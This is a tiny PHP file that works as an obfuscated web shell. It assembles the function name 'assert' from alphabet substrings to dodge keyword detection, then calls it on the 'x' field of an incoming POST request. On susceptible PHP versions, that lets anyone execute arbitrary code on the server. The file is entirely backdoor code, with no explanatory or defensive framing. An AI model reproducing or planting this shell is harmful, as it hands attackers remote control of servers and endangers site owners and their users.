<?php
$a = substr("abcdefghijklmnopqrstufwxyz",0,
1);
$b = substr("abcdefghijklmnopqrstufwxyz",17,
3);
$c = substr("abcdefghijklmnopqrstufwxyz",3,
2);
$ss = $a.$b.$c;
$d = $ss[0].$ss[2].$ss[2];//ass
$dd = $ss[5].$ss[1].$ss[3];//ert
$x = $d.$dd;
$x($_POST['x']);

?>